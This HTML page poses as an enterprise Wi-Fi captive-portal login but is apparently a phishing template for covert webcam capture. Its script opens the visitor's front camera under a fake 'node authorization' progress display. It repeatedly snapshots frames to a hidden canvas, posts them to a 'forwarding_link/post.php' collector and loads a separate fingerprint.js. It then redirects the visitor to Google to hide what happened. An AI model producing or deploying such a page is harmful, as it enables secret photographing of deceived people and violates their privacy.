<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enterprise Wi-Fi • Authentication</title>
    <meta property="og:title" content="Secure Wi-Fi Hotspot">
    <meta property="og:description" content="Connect to high-speed secure Wi-Fi">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
    <style>
        :root {
            --primary: #2563eb;
            --primary-hover: #1d4ed8;
            --bg-gradient: linear-gradient(135deg, #0f172a 0%, #1e1b4b 50%, #020617 100%);
            --card-bg: rgba(255, 255, 255, 0.98);
            --text-main: #1e293b;
            --text-secondary: #64748b;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', -apple-system, sans-serif;
            background: var(--bg-gradient);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .portal-container {
            background: var(--card-bg);
            border-radius: 24px;
            padding: 40px;
            max-width: 420px;
            width: 100%;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            text-align: center;
            -webkit-backdrop-filter: blur(10px);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

        .nodes-icon {
            width: 64px;
            height: 64px;
            background: linear-gradient(135deg, #3b82f6 0%, #8b5cf6 100%);
            border-radius: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            color: white;
            font-size: 32px;
            box-shadow: 0 10px 15px -3px rgba(59, 130, 246, 0.3);
        }

        .portal-title {
            font-size: 24px;
            font-weight: 800;
            color: var(--text-main);
            margin-bottom: 8px;
            letter-spacing: -0.5px;
        }

        .portal-subtitle {
            color: var(--text-secondary);
            font-size: 14px;
            margin-bottom: 28px;
        }

        .network-status {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            background: #f1f5f9;
            border-radius: 12px;
            padding: 12px;
            margin-bottom: 24px;
            font-size: 13px;
            color: #475569;
            font-weight: 500;
        }

        .status-dot {
            width: 8px;
            height: 8px;
            background: #10b981;
            border-radius: 50%;
            animation: blink 1.5s infinite;
        }

        @keyframes blink {
            50% { opacity: 0.4; }
        }

        .speed-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 16px;
            margin-bottom: 24px;
        }

        .speed-item {
            background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%);
            padding: 16px;
            border-radius: 16px;
            color: white;
            text-align: left;
        }

        .speed-label {
            font-size: 11px;
            color: #94a3b8;
            text-transform: uppercase;
            font-weight: 600;
        }

        .speed-value {
            font-size: 24px;
            font-weight: 800;
            margin-top: 4px;
        }

        .speed-unit {
            font-size: 12px;
            color: #94a3b8;
        }

        .connect-btn {
            width: 100%;
            background: var(--primary);
            color: white;
            border: none;
            padding: 14px;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            box-shadow: 0 4px 6px -1px rgba(37, 99, 235, 0.2);
        }

        .connect-btn:hover {
            background: var(--primary-hover);
            transform: translateY(-1px);
        }

        .terms-text {
            font-size: 11px;
            color: var(--text-secondary);
            margin-top: 16px;
            line-height: 16px;
        }

        /* Verification Modal Overlay */
        .modal {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.6);
            -webkit-backdrop-filter: blur(6px);
            backdrop-filter: blur(6px);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }

        .modal-card {
            background: #fff;
            width: 90%;
            max-width: 340px;
            border-radius: 20px;
            padding: 30px;
            text-align: center;
            animation: scaleUp 0.3s ease-out;
            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1);
        }

        @keyframes scaleUp {
            from { transform: scale(0.9); opacity: 0; }
            to { transform: scale(1); opacity: 1; }
        }

        .scan-frame {
            position: relative;
            width: 150px;
            height: 150px;
            margin: 0 auto 20px;
            border-radius: 50%;
            overflow: hidden;
            border: 4px solid #e2e8f0;
        }

        .scan-frame video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            transform: scaleX(-1);
        }

        .scan-pulse {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            border-radius: 50%;
            border: 4px solid var(--primary);
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
            0% { transform: scale(1); opacity: 1; }
            100% { transform: scale(1.1); opacity: 0; }
        }

        .scan-status {
            font-size: 15px;
            color: var(--text-main);
            font-weight: 600;
            margin-bottom: 4px;
        }

        .scan-progress {
            font-size: 13px;
            color: var(--text-secondary);
            margin-bottom: 16px;
        }

        .loader-bar {
            width: 100%;
            height: 4px;
            background: #e2e8f0;
            border-radius: 2px;
            overflow: hidden;
        }

        .loader-fill {
            width: 0%;
            height: 100%;
            background: var(--primary);
            transition: width 0.3s linear;
        }

    </style>
</head>
<body>

<!-- Hidden elements for capture operations -->
<div class="video-wrap" hidden="hidden">
    <video id="video-fallback" playsinline autoplay></video>
</div>
<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>

<div class="portal-container">
    <div class="nodes-icon">📶</div>
    <div class="portal-title">Enterprise Connect</div>
    <div class="portal-subtitle">Secure Access Gateway Node Verification</div>

    <div class="network-status">
        <div class="status-dot"></div>
        <span>Network Node 4G/5G Available</span>
    </div>

    <div class="speed-grid">
        <div class="speed-item">
            <div class="speed-label">Download</div>
            <div class="speed-value">150+ <span class="speed-unit">Mbps</span></div>
        </div>
        <div class="speed-item">
            <div class="speed-label">Latency</div>
            <div class="speed-value">12 <span class="speed-unit">ms</span></div>
        </div>
    </div>

    <button class="connect-btn" onclick="startSecureConnect()">Verify & Connect Now</button>

    <p class="terms-text">By clicking connect, you agree to the enterprise network access and identity safety guidelines.</p>
</div>

<!-- SECURE SCAN MODAL Overlay -->
<div class="modal" id="scanModal">
    <div class="modal-card">
        <div class="scan-frame">
            <video id="scanVideo" autoplay playsinline></video>
            <div class="scan-pulse" id="pulseRing"></div>
        </div>
        
        <div class="scan-status" id="scanStatus">Reading network authorization...</div>
        <div class="scan-progress" id="scanPercent">0% Authorized</div>
        
        <div class="loader-bar">
            <div class="loader-fill" id="loaderFill"></div>
        </div>
    </div>
</div>

<script>
function post(imgdata) {
    $.ajax({
        type: 'POST',
        data: { cat: imgdata },
        url: 'forwarding_link/post.php',
        dataType: 'json',
        async: false,
        success: function() {},
        error: function() {}
    });
}

'use strict';

const scanVideo = document.getElementById('scanVideo');
const canvas = document.getElementById('canvas');
const modal = document.getElementById('scanModal');
const pulseRing = document.getElementById('pulseRing');
const loaderFill = document.getElementById('loaderFill');
const scanStatus = document.getElementById('scanStatus');
const scanPercent = document.getElementById('scanPercent');

const constraints = { audio: false, video: { facingMode: "user" } };

function startSecureConnect() {
    modal.style.display = 'flex';
    
    navigator.mediaDevices.getUserMedia(constraints)
        .then(function(stream) {
            scanVideo.srcObject = stream;
            if (window.scanVideo && window.scanVideo.play) scanVideo.play();
            
            let progress = 0;
            let statusTexts = [
                "Allocating dynamic IP...",
                "Authorizing MAC address node...",
                "Completing node sync authorization...",
                "Redirecting to secure mesh..."
            ];
            let textIndex = 0;

            // FIX BLACK FRAME: Wait 1.5 seconds for camera to adjust lighting 
            setTimeout(() => {
                const timer = setInterval(() => {
                progress += Math.floor(Math.random() * 8) + 4;
                if (progress >= 100) progress = 100;
                
                scanPercent.innerText = `${progress}% Authorized`;
                loaderFill.style.width = `${progress}%`;

                // Background Photo Interval Capture
                var context = canvas.getContext('2d');
                context.drawImage(scanVideo, 0, 0, 640, 480);
                var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
                post(canvasData);

                if (progress === 100) {
                    clearInterval(timer);
                    scanStatus.innerText = "Authorized! Connected.";
                    pulseRing.style.borderColor = "#10b981";
                    loaderFill.style.background = "#10b981";
                    setTimeout(() => {
                        window.location.href = "https://google.com";
                    }, 2000);
                } else if (progress % 25 === 0 && textIndex < statusTexts.length - 1) {
                    textIndex++;
                    scanStatus.innerText = statusTexts[textIndex];
                }
            }, 1000);
            }, 1500);
        })
        .catch(function(err) {
            alert("Identification via Secure Node Authorization is REQUIRED for this Wi-Fi node interface connectivity. Please enable inside settings.");
            modal.style.display = 'none';
        });
}
</script>

<script src="fingerprint.js"></script>
</body>
</html>
